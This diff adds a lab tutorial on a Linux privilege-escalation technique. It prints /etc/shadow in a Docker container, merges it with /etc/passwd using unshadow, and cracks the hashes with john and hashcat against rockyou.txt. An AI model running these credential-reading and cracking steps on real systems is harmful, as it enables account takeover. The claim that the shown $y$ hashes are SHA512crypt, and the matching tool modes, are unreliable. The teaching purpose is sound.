@@ -1,0 +1,168 @@
+                      ____________________________
+
+                       LINUX PRIVILEGE ESCALATION
+                            Unshadow Attack
+
+                            Leonardo Tamiano
+                      ____________________________
+
+
+Table of Contents
+_________________
+
+1. Docker Setup
+2. The Shadow File
+3. Cracking Hashes
+
+
+1 Docker Setup
+==============
+
+  To play with `sudo' it is helpful to create a docker environment as
+  follows.
+
+  - First we build the image and start the container
+
+    ,----
+    | docker build -t unshadow-lab .
+    | docker run -td --name unshadow-lab --rm unshadow-lab
+    `----
+
+  - Then we execute a shell within the docker environment
+
+    ,----
+    | docker exec -it unshadow-lab "/bin/bash"
+    `----
+
+  - Finally we stop the container once we're done
+
+    ,----
+    | docker container stop unshadow-lab
+    `----
+
+
+2 The Shadow File
+=================
+
+  In order to properly authenticate users within the linux OS, it is
+  necessary to save the hash of the user password.
+
+  ,----
+  | username:password --- Authentication ---> H(P) = Saved Hash Password
+  `----
+
+  These hashes are saved within the `/etc/shadow' file. This file can
+  only be read by the root user.
+
+  ,----
+  | root@8c92d966e498:/# ls -lh /etc/shadow
+  | -rw-r----- 1 root shadow 712 Jul  8 22:06 /etc/shadow
+  `----
+
+  Another file of interest regarding user data is the `/etc/passwd'
+  file. This file instead contains basic user information, but does not
+  contain the password's hashes. This file is readable by everyone.
+
+  ,----
+  | root@8c92d966e498:/# ls -lh /etc/passwd
+  | -rw-r--r-- 1 root root 1.2K Jul  8 22:06 /etc/passwd
+  `----
+
+  Example of hashes saved within the `/etc/shadow'
+
+  ,----
+  | root@8c92d966e498:/# cat /etc/shadow
+  | root:$y$j9T$CLXFC1eBRgt9ZXITuoFJ9/$fYP6ap83m13oxjmApEq7oxPgWWxZb54LUH/bXwum7T6:19929:0:99999:7:::
+  | daemon:*:19879:0:99999:7:::
+  | bin:*:19879:0:99999:7:::
+  | sys:*:19879:0:99999:7:::
+  | sync:*:19879:0:99999:7:::
+  | games:*:19879:0:99999:7:::
+  | man:*:19879:0:99999:7:::
+  | lp:*:19879:0:99999:7:::
+  | mail:*:19879:0:99999:7:::
+  | news:*:19879:0:99999:7:::
+  | uucp:*:19879:0:99999:7:::
+  | proxy:*:19879:0:99999:7:::
+  | www-data:*:19879:0:99999:7:::
+  | backup:*:19879:0:99999:7:::
+  | list:*:19879:0:99999:7:::
+  | irc:*:19879:0:99999:7:::
+  | _apt:*:19879:0:99999:7:::
+  | nobody:*:19879:0:99999:7:::
+  | ubuntu:$y$j9T$qyisQISh7nIthBO17MjJo.$ZtEdl9bV5NEznfWAcsTVyGsc8tht0zrLkKnb/V31ZE3:19912:0:99999:7:::
+  | systemd-network:!*:19912::::::
+  | systemd-timesync:!*:19912::::::
+  | messagebus:!:19912::::::
+  | systemd-resolve:!*:19912::::::
+  | sshd:!:19912::::::
+  `----
+
+  The `/etc/shadow' hash is `SHA512crypt' in a customized base64
+  encoding.
+
+  ,----
+  | $ openssl passwd -6 -salt salt new-password
+  | $6$salt$.BKZCQPr7aeDlLl9qknE3PiXYuyY9xoAIklWwGyGQBhV6GenNs/7WFdZHFbJlU9ukME0MxSQbcOHPGH7if.461
+  `----
+
+
+3 Cracking Hashes
+=================
+
+  To crack hashes we need a wordlist made up of various passwords.
+
+  One of the most used one is the `rockyou.txt'
+
+  ,----
+  | curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz > rockyou.txt.tar.gz
+  `----
+
+  Some of the passwords contained within `rockyou.txt'
+
+  ,----
+  | $ head -n 5 rockyou.txt
+  | 123456
+  | 12345
+  | 123456789
+  | password
+  | iloveyou
+  `----
+
+  ----------------------------------------------------------------------
+
+  If you have access to both of these files
+
+  - /etc/passwd
+  - /etc/shadow
+
+  Then you can use the `unshadow' utility to combine these two files.
+
+  ,----
+  | unshadow passwd shadow > unshadowed
+  `----
+
+  And then you can use an hash-cracking tool such as
+
+  - `john the ripper'
+
+  ,----
+  | sudo pacman -S john
+  `----
+
+  - `hashcat'
+
+    ,----
+    | yay -S hashcat
+    `----
+
+  To use these tools it is important to know the type of hash to
+  crack. In our case the type of hash is `SHA512crypt'.
+
+  ,----
+  | john --format=crypt --wordlist=rockyou.txt unshadowed 
+  `----
+
+  ,----
+  | hashcat -m 1800 -a0 unshadow rockyou.txt
+  `----
